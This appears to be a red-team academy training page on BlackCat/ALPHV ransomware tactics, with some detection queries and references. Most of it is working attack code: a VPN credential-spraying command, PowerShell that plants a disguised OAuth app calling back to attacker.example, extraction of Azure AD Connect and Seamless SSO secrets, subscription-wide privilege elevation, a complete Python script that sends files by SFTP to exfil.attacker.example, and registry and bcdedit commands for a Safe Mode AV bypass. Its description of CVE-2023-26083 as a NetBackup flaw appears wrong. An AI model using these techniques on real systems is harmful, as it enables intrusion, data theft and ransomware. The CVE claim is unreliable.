---
layout: training-page
title: "BlackCat/ALPHV TTP Reference — Red Team Academy"
module: "Threat Actor Emulation"
tags:
  - blackcat
  - alphv
  - ransomware
  - azure-ad
  - entra-id
  - rust
  - double-extortion
page_key: "threat-actors-blackcat"
render_with_liquid: false
---

# BlackCat/ALPHV TTP Reference

BlackCat (also known as ALPHV) was one of the most technically sophisticated ransomware operations from 2021 to 2024, when its operators conducted an exit scam after the Change Healthcare attack ($22M ransom). BlackCat is distinguished by being the first major ransomware written in Rust, its unique focus on Azure AD / cloud identity attacks, and its triple extortion model.

## Organization Background

| Attribute | Detail |
|---|---|
| Organization type | RaaS (Ransomware-as-a-Service) |
| Active period | November 2021 — March 2024 (exit scam) |
| Successor to | DarkSide → BlackMatter → BlackCat/ALPHV |
| Encryptor language | Rust (cross-platform: Windows, Linux, VMware ESXi) |
| MITRE Group ID | G1016 |
| Common aliases | ALPHV, Noberus, UNC4466 (partial) |
| Affiliate split | 80-90% to affiliate |
| Notable attacks | Change Healthcare (2024, $22M), MGM Resorts (2023), Caesars Entertainment (2023), Reddit (2023) |

## Lineage: DarkSide → BlackMatter → BlackCat

```
Colonial Pipeline (2021): DarkSide attack → FBI seizure → DarkSide "shut down"
     ↓
BlackMatter (2021): DarkSide rebranded, same affiliate network
     ↓ FBI pressure + REvil takedowns
BlackCat/ALPHV (2021): Complete rewrite in Rust, new features, same operators
     ↓ ALPHV exit scam after Change Healthcare
Potential successor: Under investigation (2024+)
```

This lineage is operationally significant: BlackCat affiliates carried over TTPs from DarkSide/BlackMatter campaigns, including targeting ESXi hypervisors and cloud identity.

## Unique Differentiators vs Other RaaS

### 1. Rust-Based Cross-Platform Encryptor
BlackCat's encryptor runs natively on:
- Windows (x64, x86)
- Linux (including containers)
- VMware ESXi (encrypts all VMs simultaneously)

This is significant because most organizations' backup infrastructure runs on Linux/ESXi. BlackCat can encrypt the primary environment AND the backup environment in a single operation.

### 2. Azure AD Focus — Unique Among Ransomware
While most ransomware groups focus on on-premises Active Directory, BlackCat systematically targets **cloud identity** in Azure AD / Microsoft Entra ID. This is the most distinctive TTP differentiating BlackCat from other ransomware groups.

### 3. Triple Extortion
- **Encrypt** victim's files
- **Exfiltrate** and threaten to publish on leak site (alphv.onion)
- **DDoS** victim's public-facing infrastructure to apply additional pressure

## Initial Access

### T1078 — Valid Credentials (Stolen or Purchased)

BlackCat affiliates primarily access environments via stolen credentials — obtained from:
- Infostealer malware (RedLine, Vidar) output sold on Telegram markets
- IABs selling VPN/RDP access
- Phishing campaigns targeting M365 credentials

```bash
# Reconnaissance: find exposed VPN/Citrix/RDP endpoints
# OSINT for target's VPN/remote access infrastructure
shodan search "org:TargetCorp" ssl.cert.subject.cn:"*.targetcorp.com" port:443
censys search "autonomous_system.organization: TargetCorp" AND services.port:4443

# Credential stuffing against discovered VPN with breach database creds
# Tool: Snipr, SentryMBA (commercial), or custom
python3 vpn_spray.py --target https://vpn.targetcorp.com --creds breach.txt
```

### T1190 — Exchange/Veritas NetBackup Exploitation

BlackCat affiliates exploited **Veritas NetBackup** CVE-2023-26083 through CVE-2023-26091 (multiple RCEs in backup infrastructure) — specifically targeting NetBackup because it:
1. Provides remote code execution on the backup server
2. Gives access to all backup data (for exfiltration)
3. Enables backup destruction from the backup server itself

```
CVE-2023-26083: Veritas NetBackup Java Admin Console RCE
Affected versions: 8.0 - 10.1
Vector: Unauthenticated attacker on network can execute arbitrary commands
CVSS: 9.8 (Critical)

Attack sequence:
  1. Identify NetBackup admin console (port 9000/1556)
  2. Send malicious serialized Java object → RCE as root/SYSTEM
  3. Access all backup catalogs
  4. Delete or encrypt backup jobs
  5. Lateral move from backup server to production environment
```

## Azure AD / Entra ID Attack Techniques

### T1136.003 — OAuth Application Registration

```powershell
# Register a malicious OAuth application in Azure AD
# Requires: Compromised user with Application Administrator role
# (or Global Administrator — increasingly common via phishing)

# Using AzureAD PowerShell module
Connect-AzureAD -Credential (Get-Credential)

$app = New-AzureADApplication -DisplayName "Microsoft Teams Integration" `
    -ReplyUrls "https://attacker.example/callback" `
    -AvailableToOtherTenants $false

# Grant the app high-privilege Graph API permissions (requires admin consent)
# This gives persistent access even if the user's password is reset
Add-AzureADApplicationRequiredResourceAccess -ObjectId $app.ObjectId `
    -ResourceAppId "00000003-0000-0000-c000-000000000000" `  # Microsoft Graph
    -ResourceAccess @(
        @{ Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"; Type = "Scope" },  # User.Read
        @{ Id = "7427e0e9-2fba-42fe-b0c0-848c9e6a8182"; Type = "Scope" },  # offline_access
        @{ Id = "df021288-bdef-4463-88db-98f22de89214"; Type = "Role" }    # User.Read.All
    )
```

### T1528 — Azure AD Connect Sync Account Credential Extraction

**Azure AD Connect** synchronizes on-premises Active Directory with Azure AD. The sync account has extremely powerful privileges in both environments. BlackCat targets this account specifically.

The sync account's credentials are stored locally on the Azure AD Connect server in an encrypted SQL database. They can be extracted using the `AADInternals` PowerShell module:

```powershell
# Extract Azure AD Connect sync credentials (requires admin on AAD Connect server)
# Tool: AADInternals (Synapse security research library — Dr. Nestori Syynimaa)

Import-Module AADInternals

# Extract the ADSync credentials — stored in SQL CE database + DPAPI
$creds = Get-AADIntSyncCredentials
Write-Host "Sync Account: $($creds.UserName)"
Write-Host "Password:     $($creds.Password)"

# These credentials can authenticate as a Domain Admin equivalent in Azure AD
# AND have AD Replication privileges in on-premises AD → DCSync
```

**Why this is devastating:**
- The Azure AD Connect sync account has `DS-Replication-Get-Changes` permissions → can DCSync on-premises AD
- The same account's Azure AD equivalent is a Global Reader or higher
- Compromise of this account = full control of both on-premises and cloud identity

### T1556.007 — Seamless SSO Abuse (AZUREADSSOACC)

Azure AD Seamless SSO creates a computer account named `AZUREADSSOACC` in on-premises AD. The Kerberos secret key for this account can decrypt Kerberos tickets issued for Azure AD SSO — allowing forging of authentication tokens.

```powershell
# Extract AZUREADSSOACC Kerberos key (requires Domain Admin)
# Then forge Silver Tickets for Azure AD SSO authentication

Import-Module AADInternals

# Get the Kerberos encryption key for the SSO account
$sso_creds = Get-AADIntDesktopSSOAccountPassword

# With this key, forge authentication tokens for any Azure AD user
# without needing their password or passing MFA
```

**Detection:** Changes to the AZUREADSSOACC computer account; Kerberos tickets for AZUREADSSOACC from unexpected sources; AADInternals module execution (PowerShell Script Block Logging).

### T1021 — Azure Lateral Movement: Subscription-Wide Resource Access

Once BlackCat achieves Global Administrator in Azure AD, they can access all Azure subscriptions linked to the tenant:

```powershell
# As Global Admin, elevate to User Access Administrator across all subscriptions
# (Azure RBAC → allows access to all Azure resources)
# T1484.002 — Domain Policy Modification: Domain Trust Modification

Connect-AzAccount

# Elevate current user to UAA at the management group scope
New-AzRoleAssignment -SignInName "attacker@victim.onmicrosoft.com" `
    -RoleDefinitionName "User Access Administrator" `
    -Scope "/providers/Microsoft.Management/managementGroups/root-mg"

# Now access all storage accounts, VMs, databases across all subscriptions
Get-AzStorageAccount | ForEach-Object {
    $keys = Get-AzStorageAccountKey -ResourceGroupName $_.ResourceGroupName `
                                     -Name $_.StorageAccountName
    # Use storage key to access all blobs — exfiltrate data
}
```

## Exfiltration: ExMatter Custom Tool

**ExMatter** is BlackCat's custom-built exfiltration tool (distinct from StealBit used by LockBit):

```
ExMatter characteristics (from reverse engineering):
- Written in .NET (C#) — compiled just before each attack
- Targets specific file extensions: .docx, .pdf, .xlsx, .csv, .sql, .bak
- Skips files < 5KB and > 500MB
- Multi-threaded: collects and uploads simultaneously
- Protocol: SFTP (less monitored than HTTP uploads in some environments)
- Destination: attacker-controlled SFTP server or WebDAV
- Self-deletes after completion
- Sends "manifest" file listing all exfiltrated files to C2
- Reports total bytes exfiltrated to affiliate panel

Detection:
- Network: large SFTP or WebDAV uploads to previously unseen endpoints
- Process: .NET process with high disk read + network send simultaneously
- File: ExMatter drops a manifest/log file before self-deleting
- EDR: .NET binary loading with process name varying each campaign
```

```python
# ExMatter emulation concept (Python pseudocode for exercise purposes)
import os, paramiko, threading
from pathlib import Path

EXFIL_EXTENSIONS = {'.docx', '.pdf', '.xlsx', '.csv', '.sql', '.bak', '.mdb', '.pst'}
SFTP_HOST = "exfil.attacker.example"
SFTP_USER = "upload"
SFTP_KEY  = "attacker_private_key.pem"

def should_exfil(path: Path) -> bool:
    return (path.suffix.lower() in EXFIL_EXTENSIONS and
            5 * 1024 < path.stat().st_size < 500 * 1024 * 1024)

def exfil_file(sftp, local_path: Path):
    remote = f"/drops/{local_path.name}"
    sftp.put(str(local_path), remote)

def run_exfil(root: str):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(SFTP_HOST, username=SFTP_USER, key_filename=SFTP_KEY)
    sftp = ssh.open_sftp()
    
    for path in Path(root).rglob("*"):
        if path.is_file() and should_exfil(path):
            exfil_file(sftp, path)
    
    sftp.close(); ssh.close()
```

## Ransomware Execution: Intermittent Encryption

BlackCat uses **intermittent encryption** — encrypting only part of each file (e.g., every other 4KB block) instead of the entire file:

**Benefits of intermittent encryption:**
1. **Speed:** Encrypts faster — large organizations encrypted in minutes vs hours
2. **Evasion:** Behavioral detection based on "high entropy write ratio" is harder to trigger when only 50% of writes are high entropy
3. **Recovery prevention:** Even partially encrypted files are unusable for most applications

```
Standard encryption: [ENCRYPTED][ENCRYPTED][ENCRYPTED][ENCRYPTED]
Intermittent (50%):  [ENCRYPTED][PLAINTEXT][ENCRYPTED][PLAINTEXT]
                      ↑ Still breaks the file, but 2x faster

BlackCat config (from reverse engineered samples):
{
  "encryption_type": "intermittent",
  "encryption_chunk_size": 4096,
  "skip_chunk_size": 4096,
  "min_file_size_for_partial": 1048576  // files < 1MB are fully encrypted
}
```

## Safe Mode Reboot for AV Bypass

BlackCat (and some LockBit 3.0 variants) reboot the system into Safe Mode before encrypting — most EDR and AV products do not load in Safe Mode, leaving the system unprotected:

```cmd
:: BlackCat-style Safe Mode reboot bypass (T1562.001)
:: Set ransom note deployment and encryptor as auto-start in Safe Mode

:: Add registry keys that persist into Safe Mode boot
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\blackcat" ^
    /t REG_SZ /d "Service" /f

:: Add encryptor to RunOnce for Safe Mode execution
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" ^
    /v "WindowsSecurityUpdate" /t REG_SZ ^
    /d "C:\Windows\Temp\blackcat.exe --access-token CONFIG_BASE64" /f

:: Set Safe Mode auto-login for unattended execution
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" ^
    /v AutoAdminLogon /t REG_SZ /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" ^
    /v DefaultUserName /t REG_SZ /d Administrator /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" ^
    /v DefaultPassword /t REG_SZ /d Password123! /f

:: Reboot into Safe Mode
bcdedit /set {default} safeboot minimal
shutdown /r /t 5 /f
```

## MITRE ATT&CK Coverage

| Phase | ID | Technique | BlackCat Use |
|---|---|---|---|
| Initial Access | T1078 | Valid Accounts | Stolen credentials, IABs |
| Initial Access | T1190 | Exploit Public App | NetBackup, Exchange |
| Execution | T1059.001 | PowerShell | Recon, persistence |
| Persistence | T1136.003 | OAuth App Registration | Azure AD persistence |
| Defense Evasion | T1562.001 | Disable/Modify Tools | AV/EDR disable |
| Defense Evasion | T1490 | Inhibit System Recovery | Shadow copy delete |
| Credential Access | T1555 | Credentials from Stores | Browser + Azure creds |
| Credential Access | T1003.006 | DCSync | Via AAD Connect sync |
| Lateral Movement | T1021.002 | SMB | Standard PtH |
| Collection | T1530 | Data from Cloud Storage | Azure Storage access |
| Exfiltration | T1048.002 | Exfil over Encrypted Channel | ExMatter via SFTP |
| Impact | T1486 | Data Encrypted for Impact | Rust encryptor |

## Detection for Azure-Focused Attacks

```kusto
// Azure AD: New OAuth app consent in last 30 days
// KQL for Microsoft Sentinel
AuditLogs
| where TimeGenerated > ago(30d)
| where Category == "ApplicationManagement"
| where OperationName == "Consent to application"
| where Result == "success"
| project TimeGenerated, InitiatedBy, TargetResources, AdditionalDetails

// Azure AD Connect compromise: DCSync from cloud sync account
// Look for replication events from the AAD Connect sync account
SecurityEvent
| where EventID == 4662
| where Properties contains "Replicating Directory Changes"
| where SubjectUserName contains "MSOL_" or SubjectUserName contains "AAD_"
| project TimeGenerated, SubjectUserName, Computer, ObjectName
```

## References

- MITRE ATT&CK G1016 (ALPHV/BlackCat): attack.mitre.org/groups/G1016/
- CISA Advisory AA23-353A (BlackCat/ALPHV): cisa.gov
- Mandiant UNC4466 analysis (BlackCat affiliates)
- Microsoft blog: BlackCat ransomware affiliate TTPs
- ExMatter analysis: cyderes.com/blog/blackcat-exmatter-analysis
- AADInternals: aadinternals.com (Dr. Nestori Syynimaa's research)
- Azure AD attack research: dirkjanm.io (Dirk-jan Mollema)
- Change Healthcare breach analysis (2024)
